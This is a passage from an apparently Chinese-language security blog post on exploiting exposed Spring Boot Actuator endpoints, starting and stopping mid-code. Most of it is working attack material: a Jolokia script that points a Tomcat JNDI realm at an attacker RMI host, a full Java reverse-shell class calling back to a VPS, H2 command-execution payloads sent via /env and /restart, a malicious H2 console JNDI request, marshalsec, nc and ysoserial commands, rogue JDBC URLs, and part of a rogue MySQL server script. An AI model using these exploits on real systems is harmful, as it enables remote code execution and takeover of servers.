utf-8</span></span><br><span class="line"><span class="comment"># Referer: https://ricterz.me/posts/2019-03-06-yet-another-way-to-exploit-spring-boot-actuators-via-jolokia.txt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1:9094/jolokia&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create_realm = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:type=MBeanFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;createJNDIRealm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: [<span class="string">&quot;Tomcat:type=Engine&quot;</span>]</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">wirte_factory = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;contextFactory&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">write_url = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;WRITE&quot;</span>,</span><br><span class="line">    <span class="string">&quot;attribute&quot;</span>: <span class="string">&quot;connectionURL&quot;</span>,</span><br><span class="line">    <span class="string">&quot;value&quot;</span>: <span class="string">&quot;rmi://vps-ip:1389/JNDIObject&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">stop = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;stop&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">start = &#123;</span><br><span class="line">    <span class="string">&quot;mbean&quot;</span>: <span class="string">&quot;Tomcat:realmPath=/realm0,type=Realm&quot;</span>,</span><br><span class="line">    <span class="string">&quot;type&quot;</span>: <span class="string">&quot;EXEC&quot;</span>,</span><br><span class="line">    <span class="string">&quot;operation&quot;</span>: <span class="string">&quot;start&quot;</span>,</span><br><span class="line">    <span class="string">&quot;arguments&quot;</span>: []</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">flow = [create_realm, wirte_factory, write_url, stop, start]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flow:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;%s MBean %s: %s ...&#x27;</span> % (i[<span class="string">&#x27;type&#x27;</span>].title(), i[<span class="string">&#x27;mbean&#x27;</span>], i.get(<span class="string">&#x27;operation&#x27;</span>, i.get(<span class="string">&#x27;attribute&#x27;</span>))))</span><br><span class="line">    r = requests.post(url, json=i)</span><br><span class="line">    r.json()</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>测试：</p><p>JNDIObject.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *  javac -source 1.5 -target 1.5 JNDIObject.java</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *  Build By LandGrey</span></span><br><span class="line"><span class="comment"> * */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.File;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;</span><br><span class="line"><span class="keyword">import</span> java.net.Socket;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JNDIObject</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">ip</span> <span class="operator">=</span> <span class="string">&quot;your-vps-ip&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">port</span> <span class="operator">=</span> <span class="string">&quot;443&quot;</span>;</span><br><span class="line">            <span class="type">String</span> <span class="variable">py_path</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">            String[] cmd;</span><br><span class="line">            <span class="keyword">if</span> (!System.getProperty(<span class="string">&quot;os.name&quot;</span>).toLowerCase().contains(<span class="string">&quot;windows&quot;</span>)) &#123;</span><br><span class="line">                String[] py_envs = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/python&quot;</span>, <span class="string">&quot;/bin/python3&quot;</span>, <span class="string">&quot;/usr/bin/python&quot;</span>, <span class="string">&quot;/usr/bin/python3&quot;</span>, <span class="string">&quot;/usr/local/bin/python&quot;</span>, <span class="string">&quot;/usr/local/bin/python3&quot;</span>&#125;;</span><br><span class="line">                <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; py_envs.length; ++i) &#123;</span><br><span class="line">                    <span class="type">String</span> <span class="variable">py</span> <span class="operator">=</span> py_envs[i];</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">File</span>(py)).exists()) &#123;</span><br><span class="line">                        py_path = py;</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (py_path != <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;py_path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;import pty;pty.spawn(\&quot;/bin/bash\&quot;)&quot;</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;py_path, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;import pty;pty.spawn(\&quot;/bin/sh\&quot;)&quot;</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> ((<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;/bin/bash&quot;</span>)).exists()) &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/bash&quot;</span>&#125;;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;/bin/sh&quot;</span>&#125;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cmd = <span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>&#125;;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">p</span> <span class="operator">=</span> (<span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(cmd)).redirectErrorStream(<span class="literal">true</span>).start();</span><br><span class="line">            <span class="type">Socket</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Socket</span>(ip, Integer.parseInt(port));</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">pi</span> <span class="operator">=</span> p.getInputStream();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">pe</span> <span class="operator">=</span> p.getErrorStream();</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">si</span> <span class="operator">=</span> s.getInputStream();</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">po</span> <span class="operator">=</span> p.getOutputStream();</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">so</span> <span class="operator">=</span> s.getOutputStream();</span><br><span class="line">            <span class="keyword">while</span>(!s.isClosed()) &#123;</span><br><span class="line">                <span class="keyword">while</span>(pi.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pi.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(pe.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    so.write(pe.read());</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">while</span>(si.available() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    po.write(si.read());</span><br><span class="line">                &#125;</span><br><span class="line">                so.flush();</span><br><span class="line">                po.flush();</span><br><span class="line">                Thread.sleep(<span class="number">50L</span>);</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    p.exitValue();</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            p.destroy();</span><br><span class="line">            s.close();</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Throwable e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>命令执行成功</p><p><img src="https://s2.loli.net/2022/06/26/9Jqibsr7QIeC4Dl.png" alt="image-20220626021705177"></p><p>HTTP 服务受到请求</p><p><img src="https://s2.loli.net/2022/06/26/6Ygbx8NZVtpJQ1D.png" alt="image-20220626022312573"></p><p>marshalsec 也接收到了目标请求</p><p><img src="https://s2.loli.net/2022/06/26/uct47WAQGvl9JsD.png" alt="image-20220626021741930"></p><p>漏洞原理：</p><ol><li>利用 jolokia 调用 createJNDIRealm 创建 JNDIRealm</li><li>设置 connectionURL 地址为 RMI Service URL</li><li>设置 contextFactory 为 RegistryContextFactory</li><li>停止 Realm</li><li>启动 Realm 以触发指定 RMI 地址的 JNDI 注入，造成 RCE 漏洞</li></ol><h4 id="restart-h2-database-query-RCE"><a href="#restart-h2-database-query-RCE" class="headerlink" title="restart h2 database query RCE"></a>restart h2 database query RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/restart</code> 接口重启应用</li><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li></ul><p>步骤一：设置 spring.datasource.hikari.connection-test-query 属性</p><blockquote><p>⚠️ 下面payload 中的 ‘T5’ 方法每一次执行命令后都需要更换名称 (如 T6) ，然后才能被重新创建使用，否则下次 restart 重启应用时漏洞不会被触发</p></blockquote><p>spring 1.x（无回显执行命令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.hikari.connection-test-query=CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);</span><br></pre></td></tr></table></figure><p>spring 2.x（无回显执行命令）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.hikari.connection-test-query&quot;,&quot;value&quot;:&quot;CREATE ALIAS T5 AS CONCAT(&#x27;void ex(String m1,String m2,String m3)throws Exception&#123;Runti&#x27;,&#x27;me.getRun&#x27;,&#x27;time().exe&#x27;,&#x27;c(new String[]&#123;m1,m2,m3&#125;);&#125;&#x27;);CALL T5(&#x27;cmd&#x27;,&#x27;/c&#x27;,&#x27;calc&#x27;);&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤二：重启应用</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /restart</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/restart</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>测试：</p><p>POST 设置属性值</p><p><img src="https://s2.loli.net/2022/06/26/BTXYNuQ6Ef8O9Cr.png" alt="image-20220626022352954"></p><p>请求 <code>/restart</code> 接口，即可触发</p><p><img src="https://s2.loli.net/2022/06/26/ygYOsPQakUwq3lr.png" alt="image-20220626022403101"></p><p>漏洞原理：</p><ol><li>spring.datasource.hikari.connection-test-query 属性被设置为一条恶意的 <code>CREATE ALIAS</code> 创建自定义函数的 SQL 语句</li><li>其属性对应 HikariCP 数据库连接池的 connectionTestQuery 配置，定义一个新数据库连接之前被执行的 SQL 语句</li><li>restart 重启应用，会建立新的数据库连接</li><li>如果 SQL 语句中的自定义函数还没有被执行过，那么自定义函数就会被执行，造成 RCE 漏洞</li></ol><h4 id="h2-database-console-JNDI-RCE"><a href="#h2-database-console-JNDI-RCE" class="headerlink" title="h2 database console JNDI RCE"></a>h2 database console JNDI RCE</h4><p>利用条件：</p><ul><li>存在 <code>com.h2database.h2</code> 依赖（版本要求暂未知）</li><li>spring 配置中启用 h2 console <code>spring.h2.console.enabled=true</code></li><li>目标可以请求攻击者的服务器（请求可出外网）</li><li>JNDI 注入受目标 JDK 版本影响，jdk &lt; 6u201&#x2F;7u191&#x2F;8u182&#x2F;11.0.1（LDAP 方式）</li></ul><p>利用方法：</p><p>步骤一：访问路由获得 jsessionid</p><p>直接访问目标开启 h2 console 的默认路由 <code>/h2-console</code>，目标会跳转到页面 <code>/h2-console/login.jsp?jsessionid=xxxxxx</code>，记录下实际的 <code>jsessionid=xxxxxx</code> 值。</p><p>步骤二：准备要执行的 Java 代码</p><p>编写优化过后的用来反弹 shell 的java代码<code>JNDIObject.java</code>，</p><p>使用兼容低版本 jdk 的方式编译：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac -source 1.5 -target 1.5 JNDIObject.java</span><br></pre></td></tr></table></figure><p>然后将生成的 <code>JNDIObject.class</code> 文件拷贝到 <strong>步骤二</strong> 中的网站根目录。</p><p>步骤三：托管 class 文件</p><p>在自己控制的 vps 机器上开启一个简单 HTTP 服务器，端口尽量使用常见 HTTP 服务端口（80、443）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 使用 python 快速开启 http server</span><br><span class="line"></span><br><span class="line">python2 -m SimpleHTTPServer 80</span><br><span class="line">python3 -m http.server 80</span><br></pre></td></tr></table></figure><p>将<strong>步骤二</strong>中编译好的 class 文件拷贝到 HTTP 服务器根目录。</p><p>步骤四：架设恶意 ldap 服务</p><p>下载 <a href="https://github.com/mbechler/marshalsec">marshalsec</a> ，使用下面命令架设对应的 ldap 服务：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://your-vps-ip:80/#JNDIObject 1389</span><br></pre></td></tr></table></figure><p>步骤五：监听反弹 shell 的端口</p><p>一般使用 nc 监听端口，等待反弹 shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lv 443</span><br></pre></td></tr></table></figure><p>步骤六：发包触发 JNDI 注入</p><p>根据实际情况，替换下面数据中的 <code>jsessionid=xxxxxx</code>、<code>www.example.com</code> 和 <code>ldap://your-vps-ip:1389/JNDIObject</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /h2-console/login.do?jsessionid=xxxxxx</span><br><span class="line">Host: www.example.com</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Referer: http://www.example.com/h2-console/login.jsp?jsessionid=xxxxxx</span><br><span class="line"></span><br><span class="line">language=en&amp;setting=Generic+H2+%28Embedded%29&amp;name=Generic+H2+%28Embedded%29&amp;driver=javax.naming.InitialContext&amp;url=ldap://your-vps-ip:1389/JNDIObject&amp;user=&amp;password=</span><br></pre></td></tr></table></figure><p>测试：</p><p>访问h2控制台</p><p><img src="https://s2.loli.net/2022/06/26/cwkdy6Eej74gXvK.png" alt="image-20220626022436323"></p><p>发送如下数据包，url改为ldap的地址，发送即可触发RCE</p><p><img src="https://s2.loli.net/2022/06/26/MT9dB7rCnYs8IvU.png" alt="image-20220626022447977"></p><p>marshalsec 接收到了目标请求</p><p><img src="https://s2.loli.net/2022/06/26/1tHys2CqMkm3voK.png" alt="image-20220626022505695"></p><p>HTTP 也接到了请求</p><p><img src="https://s2.loli.net/2022/06/26/Ug4msGvIkTAS3Va.png" alt="image-20220626022519608"></p><h4 id="mysql-jdbc-deserialization-RCE"><a href="#mysql-jdbc-deserialization-RCE" class="headerlink" title="mysql jdbc deserialization RCE"></a>mysql jdbc deserialization RCE</h4><p>利用条件：</p><ul><li>可以 POST 请求目标网站的 <code>/env</code> 接口设置属性</li><li>可以 POST 请求目标网站的 <code>/refresh</code> 接口刷新配置（存在 <code>spring-boot-starter-actuator</code> 依赖）</li><li>目标环境中存在 <code>mysql-connector-java</code> 依赖</li><li>目标可以请求攻击者的服务器（请求可出外网）</li></ul><p>步骤一：查看环境依赖</p><p>GET 请求 <code>/env</code> 或 <code>/actuator/env</code>，搜索环境变量（classpath）中是否有 <code>mysql-connector-java</code> 关键词，并记录下其版本号（5.x 或 8.x）；</p><p>搜索并观察环境变量中是否存在常见的反序列化 gadget 依赖，比如 <code>commons-collections</code>、<code>Jdk7u21</code>、<code>Jdk8u20</code> 等；</p><p>搜索 <code>spring.datasource.url</code> 关键词，记录下其 <code>value</code> 值，方便后续恢复其正常 jdbc url 值。</p><p>步骤二：架设恶意 rogue mysql server</p><p>在自己控制的服务器上运行 springboot-jdbc-deserialization-rce.py 脚本，并使用 <a href="https://github.com/frohoff/ysoserial">ysoserial</a> 自定义要执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar ysoserial.jar CommonsCollections3 calc &gt; payload.ser</span><br></pre></td></tr></table></figure><p>在脚本<strong>同目录下</strong>生成 <code>payload.ser</code> 反序列化 payload 文件，供脚本使用。</p><p>步骤三：设置 spring.datasource.url 属性</p><blockquote><p>⚠️ 修改此属性会暂时导致网站所有的正常数据库服务不可用，会对业务造成影响，请谨慎操作！</p></blockquote><p>mysql-connector-java 5.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;statementInterceptors=com.mysql.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><p>mysql-connector-java 8.x 版本设置<strong>属性值</strong>为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jdbc:mysql://your-vps-ip:3306/mysql?characterEncoding=utf8&amp;useSSL=false&amp;queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&amp;autoDeserialize=true</span><br></pre></td></tr></table></figure><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /env</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line"></span><br><span class="line">spring.datasource.url=对应属性值</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/env</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;name&quot;:&quot;spring.datasource.url&quot;,&quot;value&quot;:&quot;对应属性值&quot;&#125;</span><br></pre></td></tr></table></figure><p>步骤四：刷新配置</p><p>spring 1.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /refresh</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br></pre></td></tr></table></figure><p>spring 2.x</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST /actuator/refresh</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure><p>步骤五：触发数据库查询</p><p>尝试访问网站已知的数据库查询的接口，例如： <code>/product/list</code> ，或者寻找其他方式，主动触发源网站进行数据库查询，然后漏洞会被触发</p><p>步骤六：恢复正常 jdbc url</p><p>反序列化漏洞利用完成后，使用 <strong>步骤三</strong> 的方法恢复 <strong>步骤一</strong> 中记录的 <code>spring.datasource.url</code> 的原始 <code>value</code> 值</p><p>测试：</p><p>利用yso生成恶意的序列化数据并保存在payload.ser文件中，这里采用cc6这条链，因为前几条受jdk版本的影响可能导致反序列化触发命令会失败</p><p><img src="https://s2.loli.net/2022/06/26/Ir3lxzGHTBwZp2C.png" alt="image-20220626095233175"></p><p>vps上运行 springboot-jdbc-deserialization-rce.py 脚本，开启一个恶意的 mysql server</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding: utf-8</span></span><br><span class="line"><span class="comment"># -**- Author: LandGrey -**-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_send</span>(<span class="params">conn, payload</span>):</span><br><span class="line">    <span class="keyword">global</span> count</span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Package order: &#123;&#125;, Send: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(count, payload))</span><br><span class="line">    conn.send(binascii.a2b_hex(payload))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">server_receive</span>(<span class="params">conn</span>):</span><br><span class="line">    <span class="keyword">global</span> count, BUFFER_SIZE</span><br><span class="line"></span><br><span class="line">    count += <span class="number">1</span></span><br><span class="line">    data = conn.recv(BUFFER_SIZE)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[*] Package order: &#123;&#125;, Receive: &#123;&#125;&quot;</span>.<span class="built_in">format</span>(count, data))</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(data).lower()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_mysql_server</span>():</span><br><span class="line">    <span class="keyword">global</span> count, deserialization_payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        count = <span class="number">0</span></span><br><span class="line">        conn, addr = server_socks.accept()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[+] Connection from client -&gt; &#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(addr[<span class="number">0</span>], addr[<span class="number">1</span>]))</span><br><span class="line">        greeting = <span class="string">&#x27;4a0000000a352e372e323900160000006c7a5d420d107a7700ffff080200ffc11500000000000000000000566d1a0a796d3e1338313747006d7973716c5f6e61746976655f70617373776f726400&#x27;</span></span><br><span class="line">        server_send(conn, greeting)</span><br><span class="line">        <span class="keyword">if</span> os.path.isfile(deserialization_file):</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(deserialization_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> _f:</span><br><span class="line">                